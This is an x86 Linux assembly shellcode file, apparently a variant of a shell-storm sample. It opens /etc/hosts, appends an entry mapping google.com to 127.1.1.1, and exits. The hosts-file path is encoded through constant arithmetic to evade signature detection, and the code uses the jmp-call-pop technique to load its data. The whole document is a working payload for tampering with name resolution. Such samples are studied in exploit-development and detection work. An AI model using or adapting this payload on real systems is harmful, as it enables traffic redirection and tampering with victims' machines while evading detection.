; this program add a new entry in hosts file pointing google.com to 127.1.1.1 
; http://shell-storm.org/shellcode/files/shellcode-893.php
;

global _start

section .text

_start:
    xor ecx, ecx
    mul ecx
    mov al, 0x5     
    
    mov dword [esp-4], ecx
    sub esp, 4

    mov esi, 0x6263625E  ;/etc///hosts  0x7374736f 
    add esi, 0x11111111
    push esi

    mov esi, 0x79404040
    sub esi , 0x11111111
    push esi

    mov esi, 0x74857640
    sub esi, 0x11111111
    push esi

    push esp
    pop ebx
    mov cx, 0x401       ;permmisions
 
    int 0x80        ;syscall to open file

    xchg eax, ebx
    push 0x4
    pop eax
    jmp short _load_data    ;jmp-call-pop technique to load the map

_write:
    pop ecx
    push 20         ;length of the string, dont forget to modify if changes the map
    pop esi
    xchg edi, esi
    xchg edx, edi
    int 0x80        ;syscall to write in the file

    push 0x6
    pop esi
    xchg edi, esi
    xchg eax, edi
    int 0x80        ;syscall to close the file

    push 0x1
    pop edi
    xchg eax, edi
    int 0x80        ;syscall to exit

_load_data:
    call _write
    google db "127.1.1.1 google.com"